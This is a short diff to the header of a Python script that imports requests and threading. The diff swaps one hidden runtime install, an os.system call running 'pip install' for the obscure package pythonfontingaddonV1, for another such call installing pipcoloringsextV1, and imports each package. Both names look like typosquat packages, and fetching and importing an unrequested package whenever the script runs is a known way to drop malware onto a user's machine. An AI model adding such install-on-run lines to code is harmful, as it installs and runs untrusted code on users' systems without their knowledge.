@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonfontingaddonV1")
-import pythonfontingaddonV1
+os.system("pip install pipcoloringsextV1")
+import pipcoloringsextV1
 from optparse import Option
 import requests
 import threading
